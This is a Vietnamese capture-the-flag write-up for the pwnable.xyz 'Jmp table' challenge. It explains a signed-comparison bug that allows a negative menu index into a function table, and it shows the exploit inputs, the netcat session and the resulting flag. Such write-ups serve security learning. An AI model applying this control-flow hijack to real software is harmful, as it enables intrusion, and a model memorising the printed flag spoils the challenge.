# Pwnable.xyz Jmp table
## Analysis
Có rất nhiều hàm nhưng chúng ta chỉ cần tập trung vào vài hàm chính  
Chương trình cho ta 5 lựa chọn nhưng nhận cả đầu vào âm:
```
void main(void)
{
  int choice;
  
  setup();
  do {
    while( true ) {
      print_menu();
      printf("> ");
      choice = read_long();
      if (choice < 5) break;
      puts("Invalid.");
    }
    (*(code *)vtable[choice])();
  } while( true );
}
```
```
void do_malloc(void)
{
  printf("Size: ");
  size = read_long();
  heap_buffer = malloc(size);
  if (heap_buffer == (void *)0x0) {
    heap_buffer = (void *)0x1;
  }
  return;
}
```
## Solution
Để ý cấu trúc các biến global:
```
size (8 bytes)
heap_buffer (8 bytes)
vtable (8 x 5 bytes)
```
Như vậy, chỉ cần để size là địa chỉ hàm win sau đó để choice = -2 là có thể chuyển hướng thực thi chương trình
```
└─$ nc svc.pwnable.xyz 30007
1. Malloc
2. Free
3. Read
4. Write
0. Exit
> 1
Size: 4196913
1. Malloc
2. Free
3. Read
4. Write
0. Exit
> -2
FLAG{signed_comparison_checked}1. Malloc
```
## Flag
```
FLAG{signed_comparison_checked}
```